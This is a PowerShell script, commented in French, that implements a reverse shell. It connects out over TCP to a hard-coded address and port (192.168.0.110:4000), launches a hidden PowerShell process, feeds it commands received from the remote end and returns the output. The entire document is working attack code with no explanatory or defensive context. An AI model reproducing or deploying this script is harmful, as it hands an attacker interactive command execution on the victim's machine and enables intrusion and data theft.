# =======================================================
#Version: 1.0
#Retourne true si la connexion est établie
# =======================================================

# =======================================================
#Déclaration des variables
# =======================================================
$address = '192.168.0.110';
$port = '4000';
$out = $null; 
$done = $false; 
$testing = 0;
$pos = 0; 
$i = 1;

# =======================================================
#Déclaration des fonctions
# =======================================================
function cleanup 
    {
        if ($client.Connected -eq $true) 
            {
                $client.Close();
            }
        if ($process.ExitCode -ne $null)
            {
                $process.Close();
            }
    exit;
    }

# =======================================================
#Execution du code
# =======================================================

#Déclaration du socket dans la variable $client
$client = New-Object system.net.sockets.tcpclient;
$client.connect($address,$port);

#Allocation de la zone tampon de notre socket
$stream = $client.GetStream();
#Allocation des ressources  réseau pour notre socket
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize;

#Création du processus cmd 
$process = New-Object System.Diagnostics.Process;
#Path du processus
#$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe';

$process.StartInfo.FileName = $env:SystemRoot+'\\system32\\WindowsPowerShell\\v1.0\\powershell.exe';

#Utilisation de ce shell
$process.StartInfo.RedirectStandardInput = 1;
$process.StartInfo.RedirectStandardOutput = 1;
#Déactive ErrorDialog
#
$process.StartInfo.UseShellExecute = 0;
#Lance le processus
$process.Start();

#Création des tampons mémoire pour les entrées et sorties
$inputstream = $process.StandardInput;
$outputstream = $process.StandardOutput;

#Pause de 1 sec
Start-Sleep 1

#Encode le stream en ASCII
$encoding = new-object System.Text.AsciiEncoding;
while($outputstream.Peek() -ne -1)
{
$out += $encoding.GetString($outputstream.Read());
}
$stream.Write($encoding.GetBytes($out),0,$out.Length);

#Si le client n'a pas aboutit, on nettoie le tout 
while (-not $done) {
if ($client.Connected -ne $true) 
    {
        cleanup;
    }
 
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);
$pos+=$read; 
if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) 
    {
    break;
    }
}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos);
$inputstream.write($string);

#Pause de 1 sec
start-sleep 1

if ($process.ExitCode -ne $null) 
    {
    cleanup;
    }
else 
    {
    $out = $encoding.GetString($outputstream.Read());
    while($outputstream.Peek() -ne -1){
    $out += $encoding.GetString($outputstream.Read()); 
    if ($out -eq $string) 
        {
        $out = '';
        }
    }
#Envoi et nettoyage des tampons
$stream.Write($encoding.GetBytes($out),0,$out.length);
$out = $null;
$string = $null;
    }
} 
else 
    {
    cleanup;
    }
}